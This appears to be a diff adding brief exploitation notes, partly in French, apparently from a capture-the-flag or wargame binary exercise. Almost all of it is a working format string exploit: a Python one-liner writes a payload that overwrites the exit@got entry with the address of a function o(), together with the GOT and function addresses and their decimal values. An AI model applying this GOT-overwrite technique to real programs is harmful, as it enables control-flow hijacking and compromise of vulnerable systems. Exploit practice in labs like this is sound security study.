@@ -1,0 +1,6 @@
+4eme argument 41414141
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/test
+
+0x08049838 134,518,840 exit@got
+0x080484a4 134,513,828 o()
